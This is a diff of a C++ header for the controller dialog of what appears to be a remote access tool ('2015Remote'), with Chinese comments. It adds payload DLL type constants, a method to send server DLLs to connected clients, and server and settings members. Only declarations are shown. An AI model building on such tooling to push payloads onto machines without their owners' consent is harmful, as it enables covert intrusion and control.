@@ -13,12 +13,19 @@
 // 是否在退出主控端时也退出客户端
 #define CLIENT_EXIT_WITH_SERVER 0
 
+enum
+{
+	PAYLOAD_DLL_X86 = 0,			// 32位 DLL
+	PAYLOAD_DLL_X64 = 1,			// 64位 DLL
+	PAYLOAD_MAXTYPE
+};
+
 // CMy2015RemoteDlg 对话框
 class CMy2015RemoteDlg : public CDialogEx
 {
 	// 构造
 public:
-	CMy2015RemoteDlg(CWnd* pParent = NULL);	// 标准构造函数
+	CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent = NULL);	// 标准构造函数
 	~CMy2015RemoteDlg();
 	// 对话框数据
 	enum { IDD = IDD_MY2015REMOTE_DIALOG };
@@ -50,7 +57,11 @@ public:
 	VOID CreateSolidMenu();	
 	BOOL ListenPort();
 	BOOL Activate(int nPort,int nMaxConnection);
-
+	void UpdateActiveWindow(CONTEXT_OBJECT* ctx);
+	void SendMasterSettings(CONTEXT_OBJECT* ctx);
+	VOID SendServerDll(CONTEXT_OBJECT* ContextObject, bool is64Bit);
+	Buffer* m_ServerDLL[PAYLOAD_MAXTYPE];
+	MasterSettings m_settings;
 	static VOID CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
 	static VOID CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
 	VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
@@ -63,7 +74,8 @@ public:
 	CTrueColorToolBar m_ToolBar;
 
 	NOTIFYICONDATA  m_Nid;
-
+	HANDLE m_hExit;
+	IOCPServer* m_iocpServer;
 	CRITICAL_SECTION m_cs;
 	BOOL       isClosed;
 
